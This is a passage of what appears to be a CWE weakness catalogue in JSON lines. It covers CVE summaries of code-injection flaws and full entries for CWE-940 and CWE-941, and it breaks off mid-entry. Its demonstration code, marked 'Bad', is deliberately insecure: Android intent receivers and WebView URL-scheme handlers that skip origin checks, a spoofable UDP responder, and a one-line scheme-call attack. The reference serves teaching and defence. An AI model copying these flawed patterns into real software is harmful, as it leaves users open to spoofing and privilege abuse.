{"Reference": "CVE-2022-1159", "Description": "Rockwell Automation Studio 5000 Logix Designer (all versions) are vulnerable when an attacker who achieves administrator access on a workstation running Studio 5000 Logix Designer could inject controller code undetectable to a user."}, {"Reference": "CVE-2022-21831", "Description": "A code injection vulnerability exists in the Active Storage >= v5.2.0 that could allow an attacker to execute code via image_processing arguments."}, {"Reference": "CVE-2022-22285", "Description": "A vulnerability using PendingIntent in Reminder prior to version 12.2.05.0 in Android R(11.0) and 12.3.02.1000 in Android S(12.0) allows attackers to execute privileged action by hijacking and modifying the intent."}, {"Reference": "CVE-2022-22286", "Description": "A vulnerability using PendingIntent in Bixby Routines prior to version 3.1.21.8 in Android R(11.0) and 2.6.30.5 in Android Q(10.0) allows attackers to execute privileged action by hijacking and modifying the intent."}, {"Reference": "CVE-2022-22985", "Description": "The absence of filters when loading some sections in the web application of the vulnerable device allows attackers to inject malicious code that will be interpreted when a legitimate user accesses the specific web section where the information is displayed. Injection can be done on specific parameters. The injected code is executed when a legitimate user attempts to review history."}, {"Reference": "CVE-2022-23120", "Description": "A code injection vulnerability in Trend Micro Deep Security and Cloud One - Workload Security Agent for Linux version 20 and below could allow an attacker to escalate privileges and run arbitrary code in the context of root. Please note: an attacker must first obtain access to the target agent in an un-activated and unconfigured state in order to exploit this vulnerability."}, {"Reference": "CVE-2022-23503", "Description": "TYPO3 is an open source PHP based web content management system. Versions prior to 8.7.49, 9.5.38, 10.4.33, 11.5.20, and 12.1.1 are vulnerable to Code Injection. Due to the lack of separating user-submitted data from the internal configuration in the Form Designer backend module, it is possible to inject code instructions to be processed and executed via TypoScript as PHP code. The existence of individual TypoScript instructions for a particular form item and a valid backend user account with access to the form module are needed to exploit this vulnerability. This issue is patched in versions 8.7.49 ELTS, 9.5.38 ELTS, 10.4.33, 11.5.20, 12.1.1."}, {"Reference": "CVE-2022-24663", "Description": "PHP Everywhere <= 2.0.3 included functionality that allowed execution of PHP Code Snippets via WordPress shortcodes, which can be used by any authenticated user."}, {"Reference": "CVE-2022-24735", "Description": "Redis is an in-memory database that persists on disk. By exploiting weaknesses in the Lua script execution environment, an attacker with access to Redis prior to version 7.0.0 or 6.2.7 can inject Lua code that will execute with the (potentially higher) privileges of another Redis user. The Lua script execution environment in Redis provides some measures that prevent a script from creating side effects that persist and can affect the execution of the same, or different script, at a later time. Several weaknesses of these measures have been publicly known for a long time, but they had no security impact as the Redis security model did not endorse the concept of users or privileges. With the introduction of ACLs in Redis 6.0, these weaknesses can be exploited by a less privileged users to inject Lua code that will execute at a later time, when a privileged user executes a Lua script. The problem is fixed in Redis versions 7.0.0 and 6.2.7. An additional workaround to mitigate this problem without patching the redis-server executable, if Lua scripting is not being used, is to block access to `SCRIPT LOAD` and `EVAL` commands using ACL rules."}, {"Reference": "CVE-2022-24816", "Description": "JAI-EXT is an open-source project which aims to extend the Java Advanced Imaging (JAI) API. Programs allowing Jiffle script to be provided via network request can lead to a Remote Code Execution as the Jiffle script is compiled into Java code via Janino, and executed. In particular, this affects the downstream GeoServer project. Version 1.2.22 will contain a patch that disables the ability to inject malicious code into the resulting script. Users unable to upgrade may negate the ability to compile Jiffle scripts from the final application, by removing janino-x.y.z.jar from the classpath."}, {"Reference": "CVE-2022-24817", "Description": "Flux2 is an open and extensible continuous delivery solution for Kubernetes. Flux2 versions between 0.1.0 and 0.29.0, helm-controller 0.1.0 to v0.19.0, and kustomize-controller 0.1.0 to v0.23.0 are vulnerable to Code Injection via malicious Kubeconfig. In multi-tenancy deployments this can also lead to privilege escalation if the controller's service account has elevated permissions. Workarounds include disabling functionality via Validating Admission webhooks by restricting users from setting the `spec.kubeConfig` field in Flux `Kustomization` and `HelmRelease` objects. Additional mitigations include applying restrictive AppArmor and SELinux profiles on the controller\u2019s pod to limit what binaries can be executed. This vulnerability is fixed in kustomize-controller v0.23.0 and helm-controller v0.19.0, both included in flux2 v0.29.0"}, {"Reference": "CVE-2022-24915", "Description": "The absence of filters when loading some sections in the web application of the vulnerable device allows attackers to inject malicious code that will be interpreted when a legitimate user accesses the web section where the information is displayed. Injection can be done on specific parameters. The injected code is executed when a legitimate user attempts to upload, copy, download, or delete an existing configuration (Administrative Services)."}, {"Reference": "CVE-2022-29813", "Description": "In JetBrains IntelliJ IDEA before 2022.1 local code execution via custom Pandoc path was possible"}, {"Reference": "CVE-2022-29814", "Description": "In JetBrains IntelliJ IDEA before 2022.1 local code execution via HTML descriptions in custom JSON schemas was possible"}, {"Reference": "CVE-2022-29815", "Description": "In JetBrains IntelliJ IDEA before 2022.1 local code execution via workspace settings was possible"}, {"Reference": "CVE-2022-29819", "Description": "In JetBrains IntelliJ IDEA before 2022.1 local code execution via links in Quick Documentation was possible"}, {"Reference": "CVE-2022-29821", "Description": "In JetBrains Rider before 2022.1 local code execution via links in ReSharper Quick Documentation was possible"}, {"Reference": "CVE-2022-30083", "Description": "EllieGrid Android Application version 3.4.1 is vulnerable to Code Injection. The application appears to evaluate user input as code (remote)."}, {"Reference": "CVE-2022-3383", "Description": "The Ultimate Member plugin for WordPress is vulnerable to Remote Code Execution in versions up to, and including, 2.5.0 via the get_option_value_from_callback function that accepts user supplied input and passes it through call_user_func(). This makes it possible for authenticated attackers, with administrative capabilities, to execute code on the server."}, {"Reference": "CVE-2022-3384", "Description": "The Ultimate Member plugin for WordPress is vulnerable to Remote Code Execution in versions up to, and including, 2.5.0 via the populate_dropdown_options function that accepts user supplied input and passes it through call_user_func(). This is restricted to non-parameter PHP functions like phpinfo(); since user supplied parameters are not passed through the function. This makes it possible for authenticated attackers, with administrative privileges, to execute code on the server."}, {"Reference": "CVE-2022-34456", "Description": " Dell EMC Metro node, Version(s) prior to 7.1, contain a Code Injection Vulnerability. An authenticated nonprivileged attacker could potentially exploit this vulnerability, leading to the execution of arbitrary OS commands on the application. "}, {"Reference": "CVE-2022-34663", "Description": "A vulnerability has been identified in RUGGEDCOM i800, RUGGEDCOM i800NC, RUGGEDCOM i801, RUGGEDCOM i801NC, RUGGEDCOM i802, RUGGEDCOM i802NC, RUGGEDCOM i803, RUGGEDCOM i803NC, RUGGEDCOM M2100, RUGGEDCOM M2100F, RUGGEDCOM M2100NC, RUGGEDCOM M2200, RUGGEDCOM M2200F, RUGGEDCOM M2200NC, RUGGEDCOM M969, RUGGEDCOM M969F, RUGGEDCOM M969NC, RUGGEDCOM RMC30, RUGGEDCOM RMC30NC, RUGGEDCOM RMC8388 V4.X, RUGGEDCOM RMC8388 V5.X, RUGGEDCOM RMC8388NC V4.X, RUGGEDCOM RMC8388NC V5.X, RUGGEDCOM RP110, RUGGEDCOM RP110NC, RUGGEDCOM RS1600, RUGGEDCOM RS1600F, RUGGEDCOM RS1600FNC, RUGGEDCOM RS1600NC, RUGGEDCOM RS1600T, RUGGEDCOM RS1600TNC, RUGGEDCOM RS400, RUGGEDCOM RS400F, RUGGEDCOM RS400NC, RUGGEDCOM RS401, RUGGEDCOM RS401NC, RUGGEDCOM RS416, RUGGEDCOM RS416F, RUGGEDCOM RS416NC, RUGGEDCOM RS416NCv2 V4.X, RUGGEDCOM RS416NCv2 V5.X, RUGGEDCOM RS416P, RUGGEDCOM RS416PF, RUGGEDCOM RS416PNC, RUGGEDCOM RS416PNCv2 V4.X, RUGGEDCOM RS416PNCv2 V5.X, RUGGEDCOM RS416Pv2 V4.X, RUGGEDCOM RS416Pv2 V5.X, RUGGEDCOM RS416v2 V4.X, RUGGEDCOM RS416v2 V5.X, RUGGEDCOM RS8000, RUGGEDCOM RS8000A, RUGGEDCOM RS8000ANC, RUGGEDCOM RS8000H, RUGGEDCOM RS8000HNC, RUGGEDCOM RS8000NC, RUGGEDCOM RS8000T, RUGGEDCOM RS8000TNC, RUGGEDCOM RS900, RUGGEDCOM RS900 (32M) V4.X, RUGGEDCOM RS900 (32M) V5.X, RUGGEDCOM RS900F, RUGGEDCOM RS900G, RUGGEDCOM RS900G (32M) V4.X, RUGGEDCOM RS900G (32M) V5.X, RUGGEDCOM RS900GF, RUGGEDCOM RS900GNC, RUGGEDCOM RS900GNC(32M) V4.X, RUGGEDCOM RS900GNC(32M) V5.X, RUGGEDCOM RS900GP, RUGGEDCOM RS900GPF, RUGGEDCOM RS900GPNC, RUGGEDCOM RS900L, RUGGEDCOM RS900LNC, RUGGEDCOM RS900M-GETS-C01, RUGGEDCOM RS900M-GETS-XX, RUGGEDCOM RS900M-STND-C01, RUGGEDCOM RS900M-STND-XX, RUGGEDCOM RS900MNC-GETS-C01, RUGGEDCOM RS900MNC-GETS-XX, RUGGEDCOM RS900MNC-STND-XX, RUGGEDCOM RS900MNC-STND-XX-C01, RUGGEDCOM RS900NC, RUGGEDCOM RS900NC(32M) V4.X, RUGGEDCOM RS900NC(32M) V5.X, RUGGEDCOM RS900W, RUGGEDCOM RS910, RUGGEDCOM RS910L, RUGGEDCOM RS910LNC, RUGGEDCOM RS910NC, RUGGEDCOM RS910W, RUGGEDCOM RS920L, RUGGEDCOM RS920LNC, RUGGEDCOM RS920W, RUGGEDCOM RS930L, RUGGEDCOM RS930LNC, RUGGEDCOM RS930W, RUGGEDCOM RS940G, RUGGEDCOM RS940GF, RUGGEDCOM RS940GNC, RUGGEDCOM RS969, RUGGEDCOM RS969NC, RUGGEDCOM RSG2100, RUGGEDCOM RSG2100 (32M) V4.X, RUGGEDCOM RSG2100 (32M) V5.X, RUGGEDCOM RSG2100F, RUGGEDCOM RSG2100NC, RUGGEDCOM RSG2100NC(32M) V4.X, RUGGEDCOM RSG2100NC(32M) V5.X, RUGGEDCOM RSG2100P, RUGGEDCOM RSG2100PF, RUGGEDCOM RSG2100PNC, RUGGEDCOM RSG2200, RUGGEDCOM RSG2200F, RUGGEDCOM RSG2200NC, RUGGEDCOM RSG2288 V4.X, RUGGEDCOM RSG2288 V5.X, RUGGEDCOM RSG2288NC V4.X, RUGGEDCOM RSG2288NC V5.X, RUGGEDCOM RSG2300 V4.X, RUGGEDCOM RSG2300 V5.X, RUGGEDCOM RSG2300F, RUGGEDCOM RSG2300NC V4.X, RUGGEDCOM RSG2300NC V5.X, RUGGEDCOM RSG2300P V4.X, RUGGEDCOM RSG2300P V5.X, RUGGEDCOM RSG2300PF, RUGGEDCOM RSG2300PNC V4.X, RUGGEDCOM RSG2300PNC V5.X, RUGGEDCOM RSG2488 V4.X, RUGGEDCOM RSG2488 V5.X, RUGGEDCOM RSG2488F, RUGGEDCOM RSG2488NC V4.X, RUGGEDCOM RSG2488NC V5.X, RUGGEDCOM RSG907R, RUGGEDCOM RSG908C, RUGGEDCOM RSG909R, RUGGEDCOM RSG910C, RUGGEDCOM RSG920P V4.X, RUGGEDCOM RSG920P V5.X, RUGGEDCOM RSG920PNC V4.X, RUGGEDCOM RSG920PNC V5.X, RUGGEDCOM RSL910, RUGGEDCOM RSL910NC, RUGGEDCOM RST2228, RUGGEDCOM RST2228P, RUGGEDCOM RST916C, RUGGEDCOM RST916P. Affected devices are vulnerable to a web-based code injection attack via the console. An attacker could exploit this vulnerability to inject code into the web server and cause malicious behavior in legitimate users accessing certain web resources on the affected device."}, {"Reference": "CVE-2022-34821", "Description": "A vulnerability has been identified in RUGGEDCOM RM1224 LTE(4G) EU (All versions < V7.2), RUGGEDCOM RM1224 LTE(4G) NAM (All versions < V7.2), SCALANCE M804PB (All versions < V7.2), SCALANCE M812-1 ADSL-Router (Annex A) (All versions < V7.2), SCALANCE M812-1 ADSL-Router (Annex B) (All versions < V7.2), SCALANCE M816-1 ADSL-Router (Annex A) (All versions < V7.2), SCALANCE M816-1 ADSL-Router (Annex B) (All versions < V7.2), SCALANCE M826-2 SHDSL-Router (All versions < V7.2), SCALANCE M874-2 (All versions < V7.2), SCALANCE M874-3 (All versions < V7.2), SCALANCE M876-3 (EVDO) (All versions < V7.2), SCALANCE M876-3 (ROK) (All versions < V7.2), SCALANCE M876-4 (All versions < V7.2), SCALANCE M876-4 (EU) (All versions < V7.2), SCALANCE M876-4 (NAM) (All versions < V7.2), SCALANCE MUM853-1 (EU) (All versions < V7.2), SCALANCE MUM856-1 (EU) (All versions < V7.2), SCALANCE MUM856-1 (RoW) (All versions < V7.2), SCALANCE S615 (All versions < V7.2), SCALANCE S615 EEC (All versions < V7.2), SCALANCE SC622-2C (All versions < V2.3), SCALANCE SC622-2C (All versions >= V2.3 < V3.0), SCALANCE SC626-2C (All versions < V2.3), SCALANCE SC626-2C (All versions >= V2.3 < V3.0), SCALANCE SC632-2C (All versions < V2.3), SCALANCE SC632-2C (All versions >= V2.3 < V3.0), SCALANCE SC636-2C (All versions < V2.3), SCALANCE SC636-2C (All versions >= V2.3 < V3.0), SCALANCE SC642-2C (All versions < V2.3), SCALANCE SC642-2C (All versions >= V2.3 < V3.0), SCALANCE SC646-2C (All versions < V2.3), SCALANCE SC646-2C (All versions >= V2.3 < V3.0), SCALANCE WAM763-1 (All versions), SCALANCE WAM766-1 (EU) (All versions), SCALANCE WAM766-1 (US) (All versions), SCALANCE WAM766-1 EEC (EU) (All versions), SCALANCE WAM766-1 EEC (US) (All versions), SCALANCE WUM763-1 (All versions), SCALANCE WUM763-1 (All versions), SCALANCE WUM766-1 (EU) (All versions), SCALANCE WUM766-1 (US) (All versions), SIMATIC CP 1242-7 V2 (All versions < V3.3.46), SIMATIC CP 1243-1 (All versions < V3.3.46), SIMATIC CP 1243-7 LTE EU (All versions < V3.3.46), SIMATIC CP 1243-7 LTE US (All versions < V3.3.46), SIMATIC CP 1243-8 IRC (All versions < V3.3.46), SIMATIC CP 1542SP-1 IRC (All versions >= V2.0 < V2.2.28), SIMATIC CP 1543-1 (All versions < V3.0.22), SIMATIC CP 1543SP-1 (All versions >= V2.0 < V2.2.28), SIPLUS ET 200SP CP 1542SP-1 IRC TX RAIL (All versions >= V2.0 < V2.2.28), SIPLUS ET 200SP CP 1543SP-1 ISEC (All versions >= V2.0 < V2.2.28), SIPLUS ET 200SP CP 1543SP-1 ISEC TX RAIL (All versions >= V2.0 < V2.2.28), SIPLUS NET CP 1242-7 V2 (All versions < V3.3.46), SIPLUS NET CP 1543-1 (All versions < V3.0.22), SIPLUS S7-1200 CP 1243-1 (All versions < V3.3.46), SIPLUS S7-1200 CP 1243-1 RAIL (All versions < V3.3.46). By injecting code to specific configuration options for OpenVPN, an attacker could execute arbitrary code with elevated privileges."}, {"Reference": "CVE-2022-3696", "Description": "A post-auth code injection vulnerability allows admins to execute code in Webadmin of Sophos Firewall releases older than version 19.5 GA."}, {"Reference": "CVE-2022-37009", "Description": "In JetBrains IntelliJ IDEA before 2022.2 local code execution via a Vagrant executable was possible"}, {"Reference": "CVE-2022-3713", "Description": "A code injection vulnerability allows adjacent attackers to execute code in the Wifi controller of Sophos Firewall releases older than version 19.5 GA."}, {"Reference": "CVE-2022-40127", "Description": "A vulnerability in Example Dags of Apache Airflow allows an attacker with UI access who can trigger DAGs, to execute arbitrary commands via manually provided run_id parameter. This issue affects Apache Airflow Apache Airflow versions prior to 2.4.0."}, {"Reference": "CVE-2022-4060", "Description": "The User Post Gallery WordPress plugin through 2.19 does not limit what callback functions can be called by users, making it possible to any visitors to run code on sites running it."}, {"Reference": "CVE-2022-40628", "Description": "This vulnerability exists in Tacitine Firewall, all versions of EN6200-PRIME QUAD-35 and EN6200-PRIME QUAD-100 between 19.1.1 to 22.20.1 (inclusive), due to improper control of code generation in the Tacitine Firewall web-based management interface. An unauthenticated remote attacker could exploit this vulnerability by sending a specially crafted http request on the targeted device. Successful exploitation of this vulnerability could allow an unauthenticated remote attacker to execute arbitrary commands on the targeted device."}, {"Reference": "CVE-2022-41205", "Description": "SAP GUI allows an authenticated attacker to execute scripts in the local network. On successful exploitation, the attacker can gain access to registries which can cause a limited impact on confidentiality and high impact on availability of the application. "}, {"Reference": "CVE-2022-41264", "Description": "Due to the unrestricted scope of the RFC function module, SAP BASIS - versions 731, 740, 750, 751, 752, 753, 754, 755, 756, 757, 789, 790, 791, allows an authenticated non-administrator attacker to access a system class and execute any of its public methods with parameters provided by the attacker. On successful exploitation the attacker can have full control of the system to which the class belongs, causing a high impact on the integrity of the application. "}, {"Reference": "CVE-2022-42268", "Description": " Omniverse Kit contains a vulnerability in the reference applications Create, Audio2Face, Isaac Sim, View, Code, and Machinima. These applications allow executable Python code to be embedded in Universal Scene Description (USD) files to customize all aspects of a scene. If a user opens a USD file that contains embedded Python code in one of these applications, the embedded Python code automatically runs with the privileges of the user who opened the file. As a result, an unprivileged remote attacker could craft a USD file containing malicious Python code and persuade a local user to open the file, which may lead to information disclosure, data tampering, and denial of service. "}, {"Reference": "CVE-2022-42699", "Description": "Auth. Remote Code Execution vulnerability in Easy WP SMTP plugin <= 1.5.1 on WordPress. "}, {"Reference": "CVE-2022-43571", "Description": "In Splunk Enterprise versions below 8.2.9, 8.1.12, and 9.0.2, an authenticated user can execute arbitrary code through the dashboard PDF generation component. "}, {"Reference": "CVE-2022-46157", "Description": "Akeneo PIM is an open source Product Information Management (PIM). Akeneo PIM Community Edition versions before v5.0.119 and v6.0.53 allows remote authenticated users to execute arbitrary PHP code on the server by uploading a crafted image. Akeneo PIM Community Edition after the versions aforementioned provides patched Apache HTTP server configuration file, for docker setup and in documentation sample, to fix this vulnerability. Community Edition users must change their Apache HTTP server configuration accordingly to be protected. The patch for Cloud Based Akeneo PIM Services customers has been applied since 30th October 2022. Users are advised to upgrade. Users unable to upgrade may Replace any reference to `<FilesMatch \\\\.php$>` in their apache httpd configurations with: `<Location \"/index.php\">`."}, {"Reference": "CVE-2022-46166", "Description": "Spring boot admins is an open source administrative user interface for management of spring boot applications. All users who run Spring Boot Admin Server, having enabled Notifiers (e.g. Teams-Notifier) and write access to environment variables via UI are affected. Users are advised to upgrade to the most recent releases of Spring Boot Admin 2.6.10 and 2.7.8 to resolve this issue. Users unable to upgrade may disable any notifier or disable write access (POST request) on `/env` actuator endpoint. "}, {"Reference": "CVE-2022-23332", "Description": "Command injection vulnerability in Manual Ping Form (Web UI) in Shenzhen Ejoin Information Technology Co., Ltd. ACOM508/ACOM516/ACOM532 609-915-041-100-020 allows a remote attacker to inject arbitrary code via the field."}, {"Reference": "CVE-2022-24295", "Description": "Okta Advanced Server Access Client for Windows prior to version 1.57.0 was found to be vulnerable to command injection via a specially crafted URL."}, {"Reference": "CVE-2022-4170", "Description": "The rxvt-unicode package is vulnerable to a remote code execution, in the Perl background extension, when an attacker can control the data written to the user's terminal and certain options are set."}, {"Reference": "CVE-2022-25921", "Description": "All versions of package morgan-json are vulnerable to Arbitrary Code Execution due to missing sanitization of input passed to the Function constructor."}, {"Reference": "CVE-2022-21122", "Description": "The package metacalc before 0.0.2 are vulnerable to Arbitrary Code Execution when it exposes JavaScript's Math class to the v8 context. As the Math class is exposed to user-land, it can be used to get access to JavaScript's Function constructor."}, {"Reference": "CVE-2021-34994", "Description": "This vulnerability allows remote attackers to execute arbitrary code on affected installations of Commvault CommCell 11.22.22. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the DataProvider class. The issue results from the lack of proper validation of a user-supplied string before executing it as JavaScript code. An attacker can leverage this vulnerability to escape the JavaScript sandbox and execute Java code in the context of NETWORK SERVICE. Was ZDI-CAN-13755."}, {"Reference": "CVE-2021-37079", "Description": "There is a Improper Input Validation vulnerability in Huawei Smartphone.Successful exploitation of this vulnerability may lead to delete arbitrary file by system_app permission."}, {"Reference": "CVE-2021-38450", "Description": "The affected controllers do not properly sanitize the input containing code syntax. As a result, an attacker could craft code to alter the intended controller flow of the software."}, {"Reference": "CVE-2021-44734", "Description": "Embedded web server input sanitization vulnerability in Lexmark devices through 2021-12-07, which can which can lead to remote code execution on the device."}, {"Reference": "CVE-2022-25894", "Description": "All versions of the package com.bstek.uflo:uflo-core are vulnerable to Remote Code Execution (RCE) in the ExpressionContextImpl class via jexl.createExpression(expression).evaluate(context); functionality, due to improper user input validation."}, {"Reference": "CVE-2021-38703", "Description": "Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090."}]}
{"ID": "940", "Name": "Improper Verification of Source of a Communication Channel", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.", "ExtendedDescription": "When an attacker can successfully establish a communication channel from an untrusted origin, the attacker may be able to gain privileges and access unexpected functionality.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "923", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "346", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Access Control", "Other"], "Impact": ["Gain Privileges or Assume Identity", "Varies by Context"], "Note": "An attacker can access any functionality that is inadvertently accessible to the source."}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "\n\nUse a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using an Adversary-in-the-Middle (AITM) attack.\n\n\nWhen designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate.\n"}], "DemonstrativeExamples": [{"ID": "DX-112", "Entries": [{"IntroText": "This Android application will remove a user account when it receives an intent to do so:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tIntentFilter filter = new IntentFilter(\"com.example.RemoveUser\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n\tpublic class DeleteReceiver extends BroadcastReceiver {\n\t\t@Override\n\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\tint userID = intent.getIntExtra(\"userID\");\n\t\t\tdestroyUserData(userID);\n\t\t}\n\t}\n```"}, {"BodyText": "This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file."}]}, {"ID": "DX-109", "Entries": [{"IntroText": "These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n```\n// Android* \n\t@Override\n\tpublic boolean shouldOverrideUrlLoading(WebView view, String url){\n\t```\n\t\t\tif (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){\n\t\t\t\tif(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){\n\t\t\t\t\twriteDataToView(view, UserData);\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t}\n```"}, {"Nature": "Bad", "Language": "Objective-C", "ExampleCode": "```\n```\n// iOS* \n\t-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType\n\t{\n\t```\n\t\t\tNSURL *URL = [exRequest URL];\n\t\t\tif ([[URL scheme] isEqualToString:@\"exampleScheme\"])\n\t\t\t{\n\t\t\t\t\tNSString *functionString = [URL resourceSpecifier];\n\t\t\t\t\tif ([functionString hasPrefix:@\"specialFunction\"])\n\t\t\t\t\t{\n```\n// Make data available back in webview.* \n\t\t\t\t\t\t\tUIWebView *webView = [self writeDataToView:[URL query]];}\n\t\t\t\t\treturn NO;}\n\t\t\treturn YES;}"}, {"BodyText": "A call into native code can then be initiated by passing parameters within the URL:"}, {"Nature": "Attack", "Language": "JavaScript", "ExampleCode": "```\n\twindow.location = examplescheme://method?parameter=value\n```"}, {"BodyText": "Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."}]}], "ObservedExamples": [{"Reference": "CVE-2000-1218", "Description": "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-1218"}, {"Reference": "CVE-2005-0877", "Description": "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0877"}, {"Reference": "CVE-2001-1452", "Description": "DNS server caches glue records received from non-delegated name servers", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1452"}], "RelatedAttackPatterns": ["500", "594", "595", "596"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "While many access control issues involve authenticating the user, this weakness is more about authenticating the actual source of the communication channel itself; there might not be any \"user\" in such cases."}], "Top25Examples": [{"Reference": "CVE-2022-27491", "Description": "A improper verification of source of a communication channel in Fortinet FortiOS with IPS engine version 7.201 through 7.214, 7.001 through 7.113, 6.001 through 6.121, 5.001 through 5.258 and before 4.086 allows a remote and unauthenticated attacker to trigger the sending of \"blocked page\" HTML data to an arbitrary victim via crafted TCP requests, potentially flooding the victim."}, {"Reference": "CVE-2022-29235", "Description": "BigBlueButton is an open source web conferencing system. Starting in version 2.2 and prior to versions 2.3.18 and 2.4-rc-6, an attacker who is able to obtain the meeting identifier for a meeting on a server can find information related to an external video being shared, like the current timestamp and play/pause. The problem has been patched in versions 2.3.18 and 2.4-rc-6 by modifying the stream to send the data only for users in the meeting. There are currently no known workarounds."}]}
{"ID": "941", "Name": "Incorrectly Specified Destination in a Communication Channel", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.", "ExtendedDescription": "\n\nAttackers at the destination may be able to spoof trusted servers to steal data or cause a denial of service.\n\n\nThere are at least two distinct weaknesses that can cause the product to communicate with an unintended destination:\n\n\n  - If the product allows an attacker to control which destination is specified, then the attacker can cause it to connect to an untrusted or malicious destination. For example, because UDP is a connectionless protocol, UDP packets can be spoofed by specifying a false source address in the packet; when the server receives the packet and sends a reply, it will specify a destination by using the source of the incoming packet - i.e., the false source. The server can then be tricked into sending traffic to the wrong host, which is effective for hiding the real source of an attack and for conducting a distributed denial of service (DDoS). As another example, server-side request forgery (SSRF) and XML External Entity (XXE) can be used to trick a server into making outgoing requests to hosts that cannot be directly accessed by the attacker due to firewall restrictions.\n\n  - If the product incorrectly specifies the destination, then an attacker who can control this destination might be able to spoof trusted servers. While the most common occurrence is likely due to misconfiguration by an administrator, this can be resultant from other weaknesses. For example, the product might incorrectly parse an e-mail or IP address and send sensitive data to an unintended destination. As another example, an Android application may use a \"sticky broadcast\" to communicate with a receiver for a particular application, but since sticky broadcasts can be processed by *any* receiver, this can allow a malicious application to access restricted data that was only intended for a different application.\n\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "923", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "406", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "DemonstrativeExamples": [{"ID": "DX-113", "Entries": [{"IntroText": "This code listens on a port for DNS requests and sends the result to the requesting address."}, {"Nature": "Bad", "Language": "Python", "ExampleCode": "```\n\tsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\tsock.bind( (UDP_IP,UDP_PORT) )\n\twhile true:\n\t\t\tdata = sock.recvfrom(1024)\n\t\t\tif not data:\n\t\t\t\tbreak\n\t\t\t(requestIP, nameToResolve) = parseUDPpacket(data)\n\t\t\trecord = resolveName(nameToResolve)\n\t\t\tsendResponse(requestIP,record)\n```"}, {"BodyText": "This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic."}]}], "ObservedExamples": [{"Reference": "CVE-2013-5211", "Description": "composite: NTP feature generates large responses (high amplification factor) with spoofed UDP source addresses.", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-5211"}, {"Reference": "CVE-1999-0513", "Description": "Classic \"Smurf\" attack, using spoofed ICMP packets to broadcast addresses.", "Link": "https://www.cve.org/CVERecord?id=CVE-1999-0513"}, {"Reference": "CVE-1999-1379", "Description": "DNS query with spoofed source address causes more traffic to be returned to spoofed address than was sent by the attacker.", "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1379"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-21671", "Description": "@replit/crosis is a JavaScript client that speaks Replit's container protocol. A vulnerability that involves exposure of sensitive information exists in versions prior to 7.3.1. When using this library as a way to programmatically communicate with Replit in a standalone fashion, if there are multiple failed attempts to contact Replit through a WebSocket, the library will attempt to communicate using a fallback poll-based proxy. The URL of the proxy has changed, so any communication done to the previous URL could potentially reach a 